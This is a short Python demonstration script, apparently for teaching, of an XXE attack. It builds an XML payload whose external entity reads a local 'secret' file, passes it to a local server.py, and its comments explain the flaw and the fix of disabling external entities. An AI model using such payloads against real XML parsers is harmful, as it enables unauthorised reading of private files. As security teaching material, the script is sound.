# This is a demonstration of an XXE (XML External Entity) attack.
# The attacker crafts a malicious XML document to exploit poorly configured XML parsers.
# In this example, the XXE is designed to read a "secret" file,
# which the attacker should not have access to.

import subprocess

xml = '''\
<!DOCTYPE ent [
    <!ENTITY psswds SYSTEM "../xxe-python/secret"> 
]>
<data>
    <root>&psswds;</root>
    <item>
        <name>Item 1</name>
        <price>19.99</price>
    </item>
    <item>
        <name>Item 2</name>
        <price>29.99</price>
    </item>
</data>
'''

# Send the malicious XML to the server and capture the output.
# The vulnerability lies in the server's XML parser, which processes external entities.
# Developers may overlook disabling external entities in XML parsers, leading to this vulnerability.
server_output = subprocess.check_output(["python3", "server.py", xml])
print(server_output.decode())

# Minimal fix: The server should be configured to disable the processing of external entities in XML.
# This can be done by appropriately setting the parser configuration or using a library that is secure by default.
